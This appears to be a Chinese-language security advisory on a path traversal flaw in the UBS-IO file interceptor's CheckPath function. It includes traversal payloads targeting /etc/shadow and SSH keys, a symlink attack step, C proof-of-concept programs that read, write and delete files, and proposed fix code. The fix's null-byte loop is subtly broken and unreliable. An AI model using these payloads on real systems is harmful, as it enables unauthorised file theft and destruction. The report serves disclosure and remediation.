# VULN-IO-001: Path Traversal Vulnerability in CheckPath Function

## 漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-IO-001 |
| 类型 | Path Traversal (路径遍历) |
| CWE | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| 严重性 | HIGH |
| 置信度 | 85% |
| 状态 | 已确认 (真实漏洞) |

## 受影响代码

### 文件位置
- **主文件**: `ubsio-boostio/src/io_interceptor/src/posix_interceptor.cpp`
- **辅助文件**: `ubsio-boostio/src/io_interceptor/src/filestream_interceptor.cpp`
- **行号**: 68-79 (posix_interceptor.cpp), 29-41 (filestream_interceptor.cpp)
- **函数**: `CheckPath`

### 漏洞代码片段

```cpp
// posix_interceptor.cpp:68-79 - 不安全的路径验证函数
static inline bool CheckPath(const char *path)
{
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }
    return true;  // 仅检查非空和非空字符串，无路径遍历验证！
}

// filestream_interceptor.cpp:29-41 - 同样的问题
static inline bool CheckPath(const char* path)
{
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }
    return true;
}
```

### CheckPath安全检查缺失分析

| 检查项 | 当前状态 | 安全要求 | 风险 |
|--------|----------|----------|------|
| NULL指针检查 | 已实现 | 必须 | 无 |
| 空字符串检查 | 已实现 | 必须 | 无 |
| 路径长度检查 | **缺失** | PATH_MAX (4096) | 缓冲区溢出风险 |
| 路径遍历序列检查 | **缺失** | 检查 `../` | 目录遍历攻击 |
| 绝对路径限制 | **缺失** | 可配置的白名单 | 越界访问 |
| 符号链接解析 | **缺失** | realpath规范化 | 符号链接攻击 |
| Null字节注入 | **缺失** | 检查路径中的 `\0` | 路径截断攻击 |
| 双斜杠检查 | **缺失** | 检查 `//` | 绕过某些安全检查 |

## 受影响的Hook函数清单

### posix_interceptor.cpp中的受影响函数

| 函数 | 行号 | 操作类型 | 安全影响 |
|------|------|----------|----------|
| `HookOpen` | 81-94 | 文件打开 | 任意文件读取/写入 |
| `HookOpen64` | 96-109 | 文件打开 | 任意文件读取/写入 |
| `HookOpenAt` | 111-124 | 目录相对打开 | 路径遍历+基目录绕过 |
| `HookOpenAt64` | 126-139 | 目录相对打开 | 路径遍历+基目录绕过 |
| `HookCreat` | 141-150 | 文件创建 | 任意文件创建 |
| `HookCreat64` | 152-161 | 文件创建 | 任意文件创建 |
| `HookTruncate` | 331-340 | 文件截断 | 任意文件截断/破坏 |
| `HookTruncate64` | 342-351 | 文件截断 | 任意文件截断/破坏 |
| `HookStat` | 408-417 | 文件状态查询 | 信息泄露 |
| `HookStat64` | 419-428 | 文件状态查询 | 信息泄露 |
| `HookLstat` | 430-439 | 链接状态查询 | 信息泄露 |
| `HookLstat64` | 441-450 | 链接状态查询 | 信息泄露 |
| `HookFstatAt` | 474-483 | 目录相对状态 | 信息泄露+路径遍历 |
| `HookFstatAt64` | 485-494 | 目录相对状态 | 信息泄露+路径遍历 |
| `HookAccess` | 496-505 | 文件权限检查 | 信息泄露 |
| `HookUnlink` | 507-516 | 文件删除 | 任意文件删除 |
| `HookUnlinkat` | 518-527 | 目录相对删除 | 任意文件删除 |
| `HookRename` | 529-538 | 文件重命名 | 任意文件移动 |
| `HookUtimes` | 540-549 | 文件时间修改 | 任意文件时间篡改 |
| `HookRemove` | 585-594 | 通用删除 | 任意文件/目录删除 |

### filestream_interceptor.cpp中的受影响函数

| 函数 | 行号 | 操作类型 | 安全影响 |
|------|------|----------|----------|
| `HookFopen` | 43-55 | 文件流打开 | 任意文件读取/写入 |
| `HookFopen64` | 57-69 | 文件流打开 | 任意文件读取/写入 |

### 入口点 (posix_interface.cpp)

```cpp
// posix_interface.cpp - 所有POSIX syscall的拦截入口
extern "C" {
INTERCEPTOR_API int open(const char* path, int flags, ...)     // 行26
INTERCEPTOR_API int open64(const char* path, int flags, ...)   // 行36
INTERCEPTOR_API int openat(int dirfd, const char *path, ...)   // 行46
INTERCEPTOR_API int creat(const char* path, mode_t mode)       // 行66
INTERCEPTOR_API int __xstat(int ver, const char* path, ...)    // 行185
INTERCEPTOR_API int __lxstat(int ver, const char* path, ...)   // 行197
INTERCEPTOR_API int access(const char* path, int mode)         // 行233
INTERCEPTOR_API int unlink(const char* path)                   // 行239
INTERCEPTOR_API int truncate(const char* filename, off_t)      // 行269
INTERCEPTOR_API int rename(const char* oldName, const char*)   // 行293
INTERCEPTOR_API int remove(const char* path)                   // 行305
}
```

## 漏洞分析

### 1. 触发条件

**必要条件:**
1. 目标应用程序通过 `LD_PRELOAD` 加载了 `libock_interceptor.so`
2. 应用程序调用被拦截的POSIX文件操作函数
3. 应用程序允许用户输入控制文件路径参数

**充分条件:**
- 应用程序未对用户提供的路径进行充分验证
- 或应用程序依赖 UBS-IO 进行路径验证（错误的安全假设）

### 2. 数据流分析

```
[用户输入/应用程序]
        │
        ▼
    用户可控路径 (可能包含 "../" 或其他恶意序列)
        │
        ▼
[LD_PRELOAD 拦截层]
    posix_interface.cpp / filestream_interface.cpp
        │ open(path) / creat(path) / unlink(path) 等
        ▼
[Hook 函数层]
    posix_interceptor.cpp / filestream_interceptor.cpp
        │ HookOpen() / HookCreat() / HookUnlink() 等
        ▼
[验证层 - 有缺陷]
    CheckPath(path)
        │ 仅检查: path != NULL && path[0] != '\0'
        │ 缺失检查: "../" 路径遍历
        │          绝对路径限制
        │          符号链接解析
        │          路径长度限制
        │          Null字节注入
        ▼
[执行层]
    NATIVE(syscall)(path) → 直接系统调用
    或
    PROXY(syscall)(path) → 代理操作 (可能发送到远程服务器)
        │
        ▼
[文件系统]
    访问/修改/删除任意可达文件
```

### 3. 攻击场景

#### 场景 A: 相对路径遍历攻击

**攻击条件**: 应用程序预期在特定目录下操作文件

```
攻击者输入: "../../../../etc/passwd"
预期目录: /app/data/safe_zone/
预期行为: 操作 /app/data/safe_zone/目标文件
实际行为: 操作 /etc/passwd (如果权限允许)

攻击者输入: "../../../proc/self/environ"
实际行为: 读取进程环境变量 (可能泄露敏感信息)

攻击者输入: "../../../../root/.ssh/id_rsa"
实际行为: 读取SSH私钥 (严重信息泄露)
```

#### 场景 B: 绝对路径攻击

**攻击条件**: 应用程序预期只操作相对路径

```
攻击者输入: "/etc/shadow"
预期目录: /app/data/
预期行为: 操作应用程序数据目录下的文件
实际行为: 尝试访问系统关键文件

攻击者输入: "/var/log/auth.log"
实际行为: 读取系统日志 (审计逃避)

攻击者输入: "/proc/1/cmdline"
实际行为: 读取init进程命令行 (信息泄露)
```

#### 场景 C: 符号链接攻击

**攻击条件**: 应用程序使用lstat但未检查符号链接目标

```
步骤1: 攻击者创建符号链接
ln -s /etc/passwd /tmp/app_data/malicious_link

步骤2: 攻击者触发文件操作
open("/tmp/app_data/malicious_link", O_RDONLY)

步骤3: CheckPath通过，但实际访问 /etc/passwd

注意: HookLstat使用__lxstat，不跟随符号链接
但 HookOpen/HookStat 会跟随符号链接
```

#### 场景 D: Null字节注入攻击

**攻击条件**: 某些文件系统可能受null字节截断影响

```
攻击者输入: "safe_file.txt%00../../etc/passwd"
(C风格字符串可能在%00处截断)

某些旧版本系统或特定文件系统可能有特殊行为
现代Linux系统通常正确处理，但值得验证
```

#### 场景 E: 代理模式远程攻击

**攻击条件**: UBS-IO以代理模式运行，请求转发到远程服务器

```
[攻击者控制的客户端]
        │ 构造恶意路径: "../../../remote_sensitive_file"
        ▼
[UBS-IO 拦截层]
        │ PROXY(open)(path)
        │ CheckPath(path) - 仅检查非空
        ▼
[远程 UBS-IO 服务器]
        │ 接收打开请求
        ▼
[远程文件系统]
        │ 打开服务器上的敏感文件
        ▼
    远程敏感文件泄露或篡改
```

### 4. PoC 构造思路

#### 环境准备

```bash
# 编译 UBS-IO
cd /home/pwn20tty/Desktop/opencode_project/openeuler/ubs-io/ubsio-boostio
bash build.sh -t release

# 创建测试环境
mkdir -p /tmp/vuln_test/{safe_zone,secret_area}
echo "TOP_SECRET_DATA" > /tmp/vuln_test/secret_area/confidential.txt
echo "normal_data" > /tmp/vuln_test/safe_zone/normal.txt
chmod 600 /tmp/vuln_test/secret_area/confidential.txt
```

#### PoC 程序 - 场景1: 文件读取攻击

```c
// poc_read.c - 演示通过open()实现路径遍历读取
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define BUF_SIZE 1024

int main(int argc, char *argv[]) {
    // 假设应用程序预期在 safe_zone 目录下工作
    // 工作目录: /tmp/vuln_test/safe_zone/
    
    // 攻击路径: 使用 ../ 逃逸到 secret_area
    const char *malicious_paths[] = {
        "../secret_area/confidential.txt",      // 单层逃逸
        "../../tmp/vuln_test/secret_area/confidential.txt",  // 绝对逃逸
        "/tmp/vuln_test/secret_area/confidential.txt",  // 绝对路径
        "../../../etc/passwd",                   // 系统文件
        NULL
    };
    
    printf("=== VULN-IO-001 Path Traversal PoC ===\n\n");
    
    for (int i = 0; malicious_paths[i] != NULL; i++) {
        printf("Testing path: %s\n", malicious_paths[i]);
        
        int fd = open(malicious_paths[i], O_RDONLY);
        if (fd >= 0) {
            char buf[BUF_SIZE];
            ssize_t n = read(fd, buf, BUF_SIZE - 1);
            if (n > 0) {
                buf[n] = '\0';
                printf("  SUCCESS! Read %zd bytes:\n", n);
                printf("  Content: %s\n", buf);
            }
            close(fd);
        } else {
            printf("  Failed: %s\n", strerror(errno));
        }
        printf("\n");
    }
    
    return 0;
}
```

#### PoC 程序 - 场景2: 文件写入攻击

```c
// poc_write.c - 演示通过creat()实现路径遍历写入
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    printf("=== VULN-IO-001 Write Path Traversal PoC ===\n\n");
    
    // 攻击者尝试在预期目录外创建文件
    const char *attack_file = "../secret_area/attack_marker.txt";
    
    printf("Attempting to create: %s\n", attack_file);
    
    int fd = creat(attack_file, 0644);
    if (fd >= 0) {
        const char *content = "ATTACK_SUCCESSFUL";
        write(fd, content, strlen(content));
        close(fd);
        printf("  SUCCESS! File created outside safe zone!\n");
        
        // 验证文件是否真的存在
        if (access(attack_file, F_OK) == 0) {
            printf("  Verified: File exists at target location\n");
        }
    } else {
        printf("  Failed: %s\n", strerror(errno));
    }
    
    return 0;
}
```

#### PoC 程序 - 场景3: 文件删除攻击

```c
// poc_delete.c - 演示通过unlink()实现路径遍历删除
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    printf("=== VULN-IO-001 Delete Path Traversal PoC ===\n\n");
    
    // 创建一个受害者文件
    const char *victim = "/tmp/vuln_test/secret_area/to_be_deleted.txt";
    FILE *f = fopen(victim, "w");
    if (f) {
        fprintf(f, "This file should be safe!");
        fclose(f);
        printf("Created victim file: %s\n", victim);
    }
    
    // 从safe_zone目录尝试删除secret_area的文件
    const char *attack_path = "../secret_area/to_be_deleted.txt";
    
    printf("Attempting to delete: %s\n", attack_path);
    
    if (unlink(attack_path) == 0) {
        printf("  SUCCESS! Deleted file outside safe zone!\n");
        
        // 验证文件是否被删除
        if (access(victim, F_OK) != 0) {
            printf("  Verified: File has been removed\n");
        }
    } else {
        printf("  Failed: %s\n", strerror(errno));
    }
    
    return 0;
}
```

#### 执行PoC

```bash
# 编译PoC程序
gcc -o poc_read poc_read.c
gcc -o poc_write poc_write.c
gcc -o poc_delete poc_delete.c

# 进入安全目录模拟应用程序工作目录
cd /tmp/vuln_test/safe_zone/

# 使用UBS-IO拦截器运行PoC
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_read
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_write
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_delete

# 验证攻击结果
ls -la /tmp/vuln_test/secret_area/
cat /tmp/vuln_test/secret_area/confidential.txt  # 如果可读，漏洞确认
cat /tmp/vuln_test/secret_area/attack_marker.txt  # 如果存在，漏洞确认
```

### 5. 实际可利用性评估

| 维度 | 评估 | 说明 |
|------|------|------|
| **前置条件复杂度** | 中等 | 需要应用程序加载UBS-IO拦截器，这在AI/ML推理场景中是常见配置 |
| **攻击复杂度** | 低 | 路径遍历是最基础的攻击技术，无需特殊技能 |
| **权限要求** | 高-中 | 需要应用程序具有目标文件的操作权限 |
| **用户交互** | 低 | 可通过API参数、配置文件、命令行等多种途径注入 |
| **影响范围** | 高 | 可影响所有文件操作：读取、写入、删除、状态查询 |
| **远程利用** | 中 | 取决于代理模式配置，可能影响远程服务器 |
| **检测难度** | 高 | 恶意路径可能被记录，但当前无路径验证日志 |

**CVSS 3.1 评估:**

```
Attack Vector (AV): Local (L) - 需要本地访问加载拦截器
Attack Complexity (AC): Low (L) - 无需特殊条件
Privileges Required (PR): Low (L) - 需要应用程序权限
User Interaction (UI): None (N) - 无需用户交互
Scope (S): Changed (C) - 可能影响其他资源
Confidentiality Impact (C): High (H) - 可读取敏感文件
Integrity Impact (I): High (H) - 可修改/删除文件
Availability Impact (A): High (H) - 可删除关键文件

CVSS Score: 8.4 (HIGH)
Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
```

## 影响范围

### 直接影响

1. **任意文件读取**: 通过 `HookOpen`, `HookFopen`, `HookStat` 可读取应用程序可达的任意文件
2. **任意文件写入**: 通过 `HookOpen(O_WRONLY)`, `HookCreat`, `HookTruncate` 可写入任意文件
3. **任意文件删除**: 通过 `HookUnlink`, `HookRemove` 可删除任意文件
4. **信息泄露**: 通过 `HookStat`, `HookAccess` 可探测文件系统结构
5. **文件时间篡改**: 通过 `HookUtimes` 可修改文件时间戳

### 间接影响

1. **拒绝服务**: 批量删除关键文件可导致服务不可用
2. **权限提升**: 修改配置文件可能提升攻击者权限
3. **审计逃避**: 删除日志文件可隐藏攻击痕迹
4. **供应链攻击**: 代理模式下可影响远程服务器
5. **数据泄露**: 读取敏感数据文件（密钥、密码、配置）

### 受影响的部署场景

UBS-IO 主要用于 AI/ML 推理服务，以下场景特别脆弱：

| 场景 | 风险等级 | 原因 |
|------|----------|------|
| NPU 推理服务 | 高 | 常加载拦截器，处理用户输入数据 |
| 大数据处理平台 | 高 | 可能处理包含路径的配置文件 |
| 存算分离架构 | 高 | 代理模式可能影响远程存储 |
| 容器化部署 | 中 | 容器隔离可能限制部分攻击 |
| 多租户环境 | 高 | 可能影响其他租户数据 |

## 与项目中安全实践的对比

### 项目中正确使用路径规范化的示例

代码库中其他模块正确使用了 `realpath` 进行路径规范化：

```cpp
// proxy_operations_loader.cpp:33-46 - 正确示例
static bool CanonicalPath(std::string &path)
{
    if (path.empty()) {
        return false;
    }
    char *tmpPath = realpath(path.c_str(), nullptr);
    if (tmpPath == nullptr) {
        return false;
    }
    path = tmpPath;
    free(tmpPath);
    return true;
}

// bio_file_util.h:205-220 - 正确示例
inline bool FileUtil::CanonicalPath(std::string &path)
{
    if (path.empty() || path.size() > 4096L) {  // 有长度检查！
        return false;
    }
    char *realPath = realpath(path.c_str(), nullptr);
    if (realPath == nullptr) {
        return false;
    }
    path = realPath;
    free(realPath);
    return true;
}
```

**对比分析:**

| 检查项 | CheckPath (漏洞代码) | CanonicalPath (安全代码) |
|--------|---------------------|--------------------------|
| NULL检查 | 有 | 有 |
| 空字符串检查 | 有 | 有 |
| 长度检查 | **无** | 有 (4096限制) |
| realpath规范化 | **无** | 有 |
| 路径遍历防护 | **无** | realpath自动解析 |

## 修复建议

### 1. 立即缓解措施 (短期 - 高优先级)

**增强 CheckPath 函数:**

```cpp
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define MAX_PATH_LENGTH PATH_MAX  // 通常为 4096

// 可配置的允许目录列表
static const char* ALLOWED_BASE_DIRS[] = {
    "/app/data",
    "/app/cache",
    "/app/logs",
    // 根据业务需求配置
};
static const size_t ALLOWED_DIRS_COUNT = 3;

static inline bool IsPathInAllowedDir(const char* resolved_path)
{
    for (size_t i = 0; i < ALLOWED_DIRS_COUNT; i++) {
        size_t dir_len = strlen(ALLOWED_BASE_DIRS[i]);
        if (strncmp(resolved_path, ALLOWED_BASE_DIRS[i], dir_len) == 0) {
            // 确保是目录边界匹配，防止 /app/data_evil 绕过
            if (resolved_path[dir_len] == '/' || resolved_path[dir_len] == '\0') {
                return true;
            }
        }
    }
    return false;
}

static inline bool CheckPath(const char *path)
{
    // 原有检查
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }
    
    // 新增: 路径长度检查
    size_t path_len = strlen(path);
    if (path_len > MAX_PATH_LENGTH) {
        INTERCEPTORLOG_WARN("Path too long: %zu > %d", path_len, MAX_PATH_LENGTH);
        errno = ENAMETOOLONG;
        return false;
    }
    
    // 新增: Null字节检查 (防止路径截断攻击)
    for (size_t i = 0; i < path_len; i++) {
        if (path[i] == '\0') {
            INTERCEPTORLOG_WARN("Null byte found in path at position %zu", i);
            errno = EINVAL;
            return false;
        }
    }
    
    // 新增: 路径遍历序列检查
    if (strstr(path, "..") != nullptr) {
        INTERCEPTORLOG_WARN("Path traversal sequence detected: %s", path);
        errno = EINVAL;
        return false;
    }
    
    // 新增: 使用 realpath 规范化路径
    char resolved_path[PATH_MAX];
    if (realpath(path, resolved_path) == nullptr) {
        // 文件不存在时 realpath 可能失败
        // 对于创建操作，可以采用更宽松的策略
        // 但仍需检查基本路径结构
        INTERCEPTORLOG_DEBUG("realpath failed for %s: %d", path, errno);
        
        // 对于不存在文件的路径验证
        // 检查是否以允许的目录为前缀
        char abs_path[PATH_MAX];
        if (path[0] != '/') {
            // 相对路径转换为绝对路径
            if (getcwd(abs_path, PATH_MAX) == nullptr) {
                errno = EACCES;
                return false;
            }
            size_t cwd_len = strlen(abs_path);
            if (cwd_len + 1 + path_len >= PATH_MAX) {
                errno = ENAMETOOLONG;
                return false;
            }
            abs_path[cwd_len] = '/';
            strncpy(abs_path + cwd_len + 1, path, path_len + 1);
        } else {
            strncpy(abs_path, path, path_len + 1);
        }
        
        // 检查绝对路径是否在允许目录内
        if (!IsPathInAllowedDir(abs_path)) {
            INTERCEPTORLOG_WARN("Path outside allowed directories: %s", abs_path);
            errno = EACCES;
            return false;
        }
        
        return true;
    }
    
    // 新增: 检查规范化后的路径是否在允许目录内
    if (!IsPathInAllowedDir(resolved_path)) {
        INTERCEPTORLOG_WARN("Resolved path outside allowed directories: %s", resolved_path);
        errno = EACCES;
        return false;
    }
    
    return true;
}
```

### 2. 深度防御措施 (中期)

**添加路径白名单配置机制:**

```cpp
// interceptor_config.h
class PathWhitelist {
private:
    std::vector<std::string> allowed_dirs_;
    bool strict_mode_;  // 严格模式下所有路径必须验证
    
public:
    static PathWhitelist& Instance() {
        static PathWhitelist instance;
        return instance;
    }
    
    bool Initialize(const std::string& config_file) {
        // 从配置文件加载允许的目录列表
        // ...
    }
    
    bool Validate(const char* path, bool must_exist = true) {
        char resolved[PATH_MAX];
        
        if (must_exist) {
            if (realpath(path, resolved) == nullptr) {
                return false;
            }
        } else {
            // 对于不存在的文件，检查路径结构
            // ...
        }
        
        for (const auto& dir : allowed_dirs_) {
            if (strncmp(resolved, dir.c_str(), dir.length()) == 0) {
                if (resolved[dir.length()] == '/' || 
                    resolved[dir.length()] == '\0') {
                    return true;
                }
            }
        }
        
        INTERCEPTORLOG_WARN("Path rejected: %s -> %s", path, resolved);
        return false;
    }
    
    void AddAllowedDir(const std::string& dir) {
        char resolved[PATH_MAX];
        if (realpath(dir.c_str(), resolved)) {
            allowed_dirs_.push_back(resolved);
        }
    }
};
```

**对关键操作添加额外保护:**

```cpp
// 对于删除操作，添加关键文件保护
static inline bool IsCriticalFile(const char* path) {
    static const char* critical_patterns[] = {
        "/etc/",
        "/bin/",
        "/sbin/",
        "/lib/",
        "/usr/",
        "/root/",
        "/home/",
        "/var/log/",
        "/proc/",
        "/sys/",
        NULL
    };
    
    char resolved[PATH_MAX];
    if (realpath(path, resolved) == nullptr) {
        return false;  // 文件不存在，允许删除请求通过
    }
    
    for (int i = 0; critical_patterns[i] != NULL; i++) {
        if (strncmp(resolved, critical_patterns[i], 
                   strlen(critical_patterns[i])) == 0) {
            return true;
        }
    }
    return false;
}

int HookUnlink(const char *path)
{
    // 增强路径验证
    if (!CheckPath(path)) {
        return -1;
    }
    
    // 关键文件保护
    if (IsCriticalFile(path)) {
        INTERCEPTORLOG_WARN("Attempt to delete critical file: %s", path);
        errno = EPERM;
        return -1;
    }
    
    // 安全审计日志
    AuditLog("UNLINK", path, "path_validation_passed");
    
    // 原有逻辑...
}
```

### 3. 架构改进建议 (长期)

1. **统一路径验证框架**: 将所有路径验证逻辑集中到一个模块
2. **配置化安全策略**: 通过配置文件定义允许的目录和操作规则
3. **安全审计日志**: 记录所有文件操作请求及其验证结果
4. **沙箱隔离**: 使用 namespace 或 chroot 限制文件系统访问
5. **Capability 限制**: 限制应用程序的文件系统操作权限

### 4. 需要同步修复的其他文件

同样的问题存在于:
- `filestream_interceptor.cpp` 的 `CheckPath` 函数 (行29-41)
- 应统一修复两个文件中的相同函数

## 测试验证建议

### 单元测试

```cpp
// test_path_validation.cpp
#include "posix_interceptor.h"
#include <gtest/gtest.h>

TEST(PathValidationTest, RejectTraversal) {
    EXPECT_FALSE(CheckPath("../../etc/passwd"));
    EXPECT_FALSE(CheckPath("../../../root/.ssh/id_rsa"));
    EXPECT_FALSE(CheckPath(".."));
    EXPECT_FALSE(CheckPath("../"));
}

TEST(PathValidationTest, RejectAbsolutePath) {
    EXPECT_FALSE(CheckPath("/etc/shadow"));
    EXPECT_FALSE(CheckPath("/proc/self/environ"));
}

TEST(PathValidationTest, RejectNullByte) {
    EXPECT_FALSE(CheckPath("safe.txt\0../../../etc/passwd"));
}

TEST(PathValidationTest, RejectTooLongPath) {
    char long_path[5000];
    memset(long_path, 'a', 4999);
    long_path[4999] = '\0';
    EXPECT_FALSE(CheckPath(long_path));
}

TEST(PathValidationTest, AcceptValidPath) {
    EXPECT_TRUE(CheckPath("normal_file.txt"));
    EXPECT_TRUE(CheckPath("subdir/file.txt"));
    // 根据白名单配置验证
}
```

### 集成测试

建议在UBS-IO的集成测试框架中添加路径遍历攻击测试场景，验证修复后的安全性。

## 参考资料

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [SEI CERT C Coding Standard: FIO02-C. Canonicalize path names originating from untrusted sources](https://wiki.sei.cmu.edu/confluence/display/c/FIO02-C.+Canonicalize+path+names+originating+from+untrusted+sources)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [CWE-36: Absolute Path Traversal](https://cwe.mitre.org/data/definitions/36.html)
- [CWE-41: Improper Resolution of Path Equivalence](https://cwe.mitre.org/data/definitions/41.html)

## 结论

**漏洞状态: 已确认 (TRUE POSITIVE)**

这是一个真实的路径遍历漏洞，CheckPath函数缺少基本的路径安全验证，影响UBS-IO拦截层的所有文件操作函数。漏洞可导致：
- 任意文件读取（信息泄露）
- 任意文件写入（数据篡改）
- 任意文件删除（拒绝服务）
- 路径探测（信息泄露）

虽然利用需要应用程序加载UBS-IO拦截器，但这在AI/ML推理服务场景中是标准配置，因此风险较高。建议立即实施上述缓解措施，并在后续版本中进行深度防御改进。

**修复优先级: HIGH**

**相关漏洞**: 
- VULN-IO-012: Path Traversal in File Deletion Hooks (本漏洞的特定场景报告)
- 本报告涵盖更广泛的攻击面（所有文件操作）
